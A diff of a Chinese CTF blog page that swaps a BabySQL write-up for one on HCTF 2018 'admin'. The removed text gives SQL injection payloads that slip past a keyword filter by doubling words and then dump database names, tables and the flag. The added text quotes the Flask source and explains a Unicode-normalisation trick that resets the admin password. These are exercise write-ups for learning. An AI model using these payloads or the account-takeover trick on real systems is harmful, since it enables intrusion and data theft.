@@ -17,7 +17,7 @@
   <meta name="description" content="BLOG">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>BUU每日一题013 - lll-nnnのblog</title>
+  <title>BUU每日一题014 - lll-nnnのblog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
 
@@ -162,7 +162,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="BUU每日一题013">
+            <span class="h2" id="subtitle" title="BUU每日一题014">
               
             </span>
 
@@ -172,8 +172,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-01-27 14:05" pubdate>
-        2021年1月27日 下午
+      <time datetime="2021-01-28 17:51" pubdate>
+        2021年1月28日 下午
       </time>
     </span>
   
@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      232 字
+      690 字
     </span>
   
 
@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      3
+      10
        分钟
     </span>
   
@@ -224,12 +224,82 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">BUU每日一题013</h1>
+            <h1 style="display: none">BUU每日一题014</h1>
             
             <div class="markdown-body">
-              <h2 id="十三、"><a href="#十三、" class="headerlink" title="十三、"></a>十三、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[极客大挑战 2019]BabySQL<br><img src="https://ftp.bmp.ovh/imgs/2021/01/ba5c0550bde2d7d3.png" srcset="/img/loading.gif">     </p>
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>SQL注入<br><code>username=1&#39;      password=1</code>报错<br><code>username=1&#39;# password=1</code>没有报错，那应该就是单引号字符型了吧<br>然后<code>order by </code><img src="https://ftp.bmp.ovh/imgs/2021/01/2c23369b6aece50e.png" srcset="/img/loading.gif"><br>只剩了<code>der</code>说明<code>or</code>被替换为空了，因为只会替换一次，所以双写即可绕过<code>oorrder by </code>然后发现<code>by</code>也被替换了，但返回显示的是<code>1#</code>前面的order不是绕过了么，怎么会没有了？？<br><code>oorrder bbyy</code>得到一共有三列<br>还有<code>select、from、where</code>也会被替换        </p>
-<h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p><code>username=1&amp;password=1&#39; ununionion selselectect 1,2,(selselectect group_concat(schema_name) frfromom infoorrmation_schema.schemata)#</code>得到所有库<img src="https://ftp.bmp.ovh/imgs/2021/01/6f07428aeecb4084.png" srcset="/img/loading.gif"><br><code>username=1&amp;password=1&#39; ununionion selselectect 1,(seleselectct group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=&#39;ctf&#39;),(selselectect group_concat(schema_name) frfromom infoorrmation_schema.schemata)#</code>ctf下的表<img src="https://ftp.bmp.ovh/imgs/2021/01/faaaf5cf1ab77e21.png" srcset="/img/loading.gif"><br><code>username=1&amp;password=1&#39; ununionion selselectect 1,(seleselectct group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name=&#39;Flag&#39;),(selselectect group_concat(schema_name) frfromom infoorrmation_schema.schemata)#</code>Flag下的列<img src="https://ftp.bmp.ovh/imgs/2021/01/a316535fcd86d177.png" srcset="/img/loading.gif"><br><code>username=1;password=1&#39; ununionion selselectect 1,(seleselectct group_concat(flag) frfromom ctf.Flag),(selselectect group_concat(schema_name) frfromom infoorrmation_schema.schemata)#</code>得到flag<img src="https://ftp.bmp.ovh/imgs/2021/01/e332d6380e96f25e.png" srcset="/img/loading.gif">    </p>
+              <h2 id="十四、"><a href="#十四、" class="headerlink" title="十四、"></a>十四、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[HCTF 2018]admin       </p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>F12<br><img src="https://img-blog.csdnimg.cn/20200517202809438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1RNXzEwMjQ=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif"><br>所以应该以admin登录，使用burp爆破密码，发现不行<br>网页还有注册功能，尝试注册admin，果然，已注册<br>那随便注册一个看看吧，<br>注册后网页还有修改密码的功能，打开，在F12中发现<img src="https://img-blog.csdnimg.cn/20200518084327983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1RNXzEwMjQ=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif"><br>打开GitHub页面，应该是网页的源码了<img src="https://ftp.bmp.ovh/imgs/2021/01/4bbc351205f263bf.png" srcset="/img/loading.gif"><br><code>hctf_flask/app/routes.py</code>这里找到各个模块的源码<br>python<br>flask<br>这一堆？？！！还是去看wp吧          </p>
+<h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>源码的主要内容<br><strong>注册模块：</strong>      </p>
+<pre><code>@app.route(&#39;/register&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])
+def register():
+
+    if current_user.is_authenticated:
+        return redirect(url_for(&#39;index&#39;))
+
+    form = RegisterForm()
+    if request.method == &#39;POST&#39;:
+        name = strlower(form.username.data)
+        if session.get(&#39;image&#39;).lower() != form.verify_code.data.lower():
+            flash(&#39;Wrong verify code.&#39;)
+            return render_template(&#39;register.html&#39;, title = &#39;register&#39;, form=form)
+        if User.query.filter_by(username = name).first():
+            flash(&#39;The username has been registered&#39;)
+            return redirect(url_for(&#39;register&#39;))
+        user = User(username=name)
+        user.set_password(form.password.data)
+        db.session.add(user)
+        db.session.commit()
+        flash(&#39;register successful&#39;)
+        return redirect(url_for(&#39;login&#39;))
+    return render_template(&#39;register.html&#39;, title = &#39;register&#39;, form = form)</code></pre>
+<p><strong>登录模块：</strong>          </p>
+<pre><code>@app.route(&#39;/login&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])
+def login():
+    if current_user.is_authenticated:
+        return redirect(url_for(&#39;index&#39;))
+
+    form = LoginForm()
+    if request.method == &#39;POST&#39;:
+        name = strlower(form.username.data)
+        session[&#39;name&#39;] = name
+        user = User.query.filter_by(username=name).first()
+        if user is None or not user.check_password(form.password.data):
+            flash(&#39;Invalid username or password&#39;)
+            return redirect(url_for(&#39;login&#39;))
+        login_user(user, remember=form.remember_me.data)
+        return redirect(url_for(&#39;index&#39;))
+    return render_template(&#39;login.html&#39;, title = &#39;login&#39;, form = form)</code></pre>
+<p><strong>改密码模块：</strong>       </p>
+<pre><code>@app.route(&#39;/change&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])
+def change():
+    if not current_user.is_authenticated:
+        return redirect(url_for(&#39;login&#39;))
+    form = NewpasswordForm()
+    if request.method == &#39;POST&#39;:
+        name = strlower(session[&#39;name&#39;])
+        user = User.query.filter_by(username=name).first()
+        user.set_password(form.newpassword.data)
+        db.session.commit()
+        flash(&#39;change successful&#39;)
+        return redirect(url_for(&#39;index&#39;))
+    return render_template(&#39;change.html&#39;, title = &#39;change&#39;, form = form)</code></pre>
+<p><strong>定义strlower：</strong>        </p>
+<pre><code>def strlower(username):
+    username = nodeprep.prepare(username)
+    return username      </code></pre>
+<p>登录有session<br>改密码还需要session验证用户<br>注册和修改密码都要经过一次strlower<br>nodeprep.prepare函数会将unicode字符<code>ᴬ</code>转换成<code>A</code>，而<code>A</code>在调用一次nodeprep.prepare函数会把<code>A</code>转换成<code>a</code><br>所以可以用Unicode字符<code>ᴬᴰᴹᴵᴺ</code>注册，然后再修改一次密码，这样就把admin的密码重置了，然后登陆即可          </p>
+<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li><p>Unicode字符         </p>
+<blockquote>
+<p>Unicode 字符可以适用于所有已知的编码。Unicode 是继 ASCII（美国国家交互信息标准编码）字符码后的一种新字符编码，它为每一个符号定义一个数字和名称，并指定字符和它的数值（码位），以及该值的二进制位表示法，通过一个十六进制数字和前缀（U）定义一个16位的数值，如：U+0041 表示 A，其唯一的名称是 LATIN CAPITAL LETTER A.<a target="_blank" rel="noopener" href="https://zhidao.baidu.com/question/6124060.html">MORE</a>          </p>
+</blockquote>
+</li>
+<li><p>flask      </p>
+<blockquote>
+<p>Flask是一个使用 Python 编写的轻量级 Web 应用框架。<br>flask的session是存在客户端的         </p>
+</blockquote>
+</li>
+</ul>
 
             </div>
             <hr>
@@ -253,18 +323,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/01/28/BUU014/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">BUU每日一题014</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/01/26/BUU012/">
-                        <span class="hidden-mobile">BUU每日一题012</span>
+                      <a href="/2021/01/27/BUU013/">
+                        <span class="hidden-mobile">BUU每日一题013</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
